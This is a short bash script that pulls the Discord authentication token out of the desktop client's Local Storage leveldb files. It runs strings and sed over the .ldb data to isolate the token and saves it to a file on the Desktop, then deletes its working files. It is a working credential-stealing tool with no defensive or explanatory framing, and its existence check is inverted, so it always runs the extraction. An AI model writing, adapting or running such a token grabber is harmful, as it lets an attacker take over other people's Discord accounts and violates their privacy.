if [ ! -d "~/.config/discord/Local\ Storage/leveldb" ];then
cd ~/.config/discord/Local\ Storage/leveldb/
strings *.ldb | grep "[^\"]*" >> djawed.txt
sed -n -e '/>oken/,$p' djawed.txt >> hello.txt
sed -n '/user_id_cache/q;p' hello.txt >> ready.txt
rm hello.txt djawed.txt
mv ready.txt ~/Desktop
else
sleep 5 
exit
fi 
